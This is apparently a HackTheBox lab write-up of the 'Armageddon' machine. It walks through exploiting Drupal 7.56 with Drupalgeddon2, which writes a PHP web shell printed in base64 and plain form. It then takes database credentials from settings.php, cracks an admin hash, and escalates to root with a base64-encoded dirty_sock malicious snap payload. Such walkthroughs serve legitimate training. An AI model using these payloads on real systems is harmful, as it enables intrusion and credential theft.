---
title: Armageddon writeup
date: 2022-06-17 13:00:00 +0200
categories: [Writeup, HackTheBox]
tags: [HackTheBox, Writeup, Easy-box]
img_path: /assets/img/armageddon/
image:
  src: Armageddon.png
  width: 1000   # in pixels
  height: 400   # in pixel
---
## Summary
This box focuses on exploiting the [drupalgeddon](https://github.com/dreadlocked/Drupalgeddon2) vulnerability to achieve a web-shell. After this some database enumeration is required to obtain ssh credentials. After this, snap is used to install a malicious package which creates a user with root privileges. (POC found [here](https://github.com/initstring/dirty_sock/blob/master/dirty_sockv2.py))

## Foothold
We start with an nmap scan to see what services are available on the machine. 
```console
# Nmap 7.92 scan initiated Fri Jan 21 19:28:01 2022 as: nmap -sC -sV -p- -o nmap/full.txt 10.129.48.89
Nmap scan report for 10.129.48.89
Host is up (0.051s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)
|   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)
|_  256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-title: Welcome to  Armageddon |  Armageddon
|_http-generator: Drupal 7 (http://drupal.org)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jan 21 19:28:22 2022 -- 1 IP address (1 host up) scanned in 21.74 seconds
```
As we can see, nmap discovered that the webserver hosts a robots.txt file. One of the directories that the file is disallowing is CHANGELOG.txt. Let's take a look:
```txt
Drupal 7.56, 2017-06-21
-----------------------
- Fixed security issues (access bypass). See SA-CORE-2017-003.

Drupal 7.55, 2017-06-07
-----------------------
- Fixed incompatibility with PHP versions 7.0.19 and 7.1.5 due to duplicate
  DATE_RFC7231 definition.
- Made Drupal core pass all automated tests on PHP 7.1.
- Allowed services such as Let's Encrypt to work with Drupal on Apache, by
  making Drupal's .htaccess file allow access to the .well-known directory
  defined by RFC 5785.
- Made new Drupal sites work correctly on Apache 2.4 when the mod_access_compat
  Apache module is disabled.
- Fixed Drupal's URL-generating functions to always encode '[' and ']' so that
  the URLs will pass HTML5 validation.
- Various additional bug fixes.
- Various API documentation improvements.
- Additional automated test coverage.

Drupal 7.54, 2017-02-01
-----------------------
(...)
```
The webserver also says "powered by Armageddon". Searching for Armageddon exploit quickly returns the following poc: <https://github.com/dreadlocked/Drupalgeddon2>

The poc works for versions of Drupal below 7.58, and based on the changelog the target system is using drupal v7.56

cloning the repository and then running the poc gives us a webshell!
```console
──(bitis㉿workstation)-[~/htb/Machines/Armageddon/Drupalgeddon2]
└─$ ./drupalgeddon2.rb http://10.129.48.89
[*] --==[::#Drupalggedon2::]==--
--------------------------------------------------------------------------------
[i] Target : http://10.129.48.89/
--------------------------------------------------------------------------------
[+] Found  : http://10.129.48.89/CHANGELOG.txt    (HTTP Response: 200)
[+] Drupal!: v7.56
--------------------------------------------------------------------------------
[*] Testing: Form   (user/password)
[+] Result : Form valid
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Clean URLs
[!] Result : Clean URLs disabled (HTTP Response: 404)
[i] Isn't an issue for Drupal v7.x
--------------------------------------------------------------------------------
[*] Testing: Code Execution   (Method: name)
[i] Payload: echo SORLROQT
[+] Result : SORLROQT
[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!
--------------------------------------------------------------------------------
[*] Testing: Existing file   (http://10.129.48.89/shell.php)
[i] Response: HTTP 404 // Size: 5
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Writing To Web Root   (./)
[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php
[+] Result : <?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }
[+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!
--------------------------------------------------------------------------------
[i] Fake PHP shell:   curl 'http://10.129.48.89/shell.php' -d 'c=hostname'
armageddon.htb>> 
```
However we have only gained access as the apache user. To gain access to a proper user we need to do some enumeration:

```console
armageddon.htb>> id
uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
armageddon.htb>> pwd
/var/www/html
armageddon.htb>> ls -al
total 288
drwxr-xr-x.  9 apache apache   4096 Jun 11 23:16 .
drwxr-xr-x.  4 root   root       33 Dec  3  2020 ..
-rw-r--r--.  1 apache apache    317 Jun 21  2017 .editorconfig
-rw-r--r--.  1 apache apache    174 Jun 21  2017 .gitignore
-rw-r--r--.  1 apache apache   6112 Jun 21  2017 .htaccess
-rw-r--r--.  1 apache apache 111613 Jun 21  2017 CHANGELOG.txt
-rw-r--r--.  1 apache apache   1481 Jun 21  2017 COPYRIGHT.txt
-rw-r--r--.  1 apache apache   1717 Jun 21  2017 INSTALL.mysql.txt
-rw-r--r--.  1 apache apache   1874 Jun 21  2017 INSTALL.pgsql.txt
-rw-r--r--.  1 apache apache   1298 Jun 21  2017 INSTALL.sqlite.txt
-rw-r--r--.  1 apache apache  17995 Jun 21  2017 INSTALL.txt
-rw-r--r--.  1 apache apache  18092 Nov 16  2016 LICENSE.txt
-rw-r--r--.  1 apache apache   8710 Jun 21  2017 MAINTAINERS.txt
-rw-r--r--.  1 apache apache   5382 Jun 21  2017 README.txt
-rw-r--r--.  1 apache apache  10123 Jun 21  2017 UPGRADE.txt
-rw-r--r--.  1 apache apache   6604 Jun 21  2017 authorize.php
-rw-r--r--.  1 apache apache    720 Jun 21  2017 cron.php
drwxr-xr-x.  4 apache apache   4096 Jun 21  2017 includes
-rw-r--r--.  1 apache apache    529 Jun 21  2017 index.php
-rw-r--r--.  1 apache apache    703 Jun 21  2017 install.php
drwxr-xr-x.  4 apache apache   4096 Dec  4  2020 misc
drwxr-xr-x. 42 apache apache   4096 Jun 21  2017 modules
drwxr-xr-x.  5 apache apache     70 Jun 21  2017 profiles
-rw-r--r--.  1 apache apache   2189 Jun 21  2017 robots.txt
drwxr-xr-x.  2 apache apache    261 Jun 21  2017 scripts
-rw-r--r--.  1 apache apache     75 Jun 11 23:16 shell.php
drwxr-xr-x.  4 apache apache     75 Jun 21  2017 sites
drwxr-xr-x.  7 apache apache     94 Jun 21  2017 themes
-rw-r--r--.  1 apache apache  19986 Jun 21  2017 update.php
-rw-r--r--.  1 apache apache   2200 Jun 21  2017 web.config
-rw-r--r--.  1 apache apache    417 Jun 21  2017 xmlrpc.php
armageddon.htb>>
```
reading the file /var/www/html/sites/default/settings.php reveals the following:
```php
$databases = array (
  'default' => 
  array (
    'default' => 
    array (
      'database' => 'drupal',
      'username' => 'drupaluser',
      'password' => 'CQHEy@9M*m23gBVj',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);
```
{: file="/var/www/html/sites/default/settings.php"}

we now have a user and password for the mysql database hosted on the system. We can still use the webshell given by the poc to perform commands, which we will use to enumerate the database.

We run the following command in the webshell:

`armageddon.htb>> mysql -e "select * from users;" -u drupaluser -p"CQHEy@9M*m23gBVj" drupal`

which returns the following entry: 

|1|brucetherealadmin|$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt|admin@armageddon.eu|

cracking the hash via hashcat gives us the credentials:

brucetherealadmin:booboo

We can then login via ssh

## Privilege escalation

running sudo -l as bruce:
```console
[brucetherealadmin@armageddon ~]$ sudo -l
Matching Defaults entries for brucetherealadmin on armageddon:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User brucetherealadmin may run the following commands on armageddon:
    (root) NOPASSWD: /usr/bin/snap install *
```
seems that we can use snap to install any package that we want. 

I found the following exploit online, which when used creates a user dirty_sock:dirty_sock that can run sudo -i <https://notes.vulndev.io/notes/redteam/privilege-escalation/misc-1>

More details on the exploit can be found [here](https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html)

The basic idea is that snapd serves a REST API via a unix socket on the system. When connecting to the socket, the connection contains a string delimited by semi-colons which contains the uid of the user making the connection. however if an attacker can control this string they can append another uid. A for loop will split the string by the delimiter, and then check each split for the uid, allowing the second uid to overwrite the real uid. This allows an attacker to fake a connection made by uid=0. This gives the attacker access to any API function, which can lead to root access. I use the dirty_sockv2 exploit, which uses this functionality to run a bash script as root creating another user named dirty_sock and adding it to the sudoers file. 

```console
[brucetherealadmin@armageddon ~]$ python -c 'print("aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw" + "A" * 4256 + "==")' | base64 -d > payload.snap
[brucetherealadmin@armageddon ~]$ ls
payload.snap  user.txt
[brucetherealadmin@armageddon ~]$ sudo snap install payload.snap --dangerous --devmode
dirty-sock 0.1 installed
[brucetherealadmin@armageddon ~]$ su dirty_sock
Password: 
[dirty_sock@armageddon brucetherealadmin]$ sudo -i

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for dirty_sock: 
[root@armageddon ~]# 
```
rooted! 

Small side note: I guess since we could run snap as sudo, the whole overwriting of the uid didn't really matter as long as we had an evil snap packet.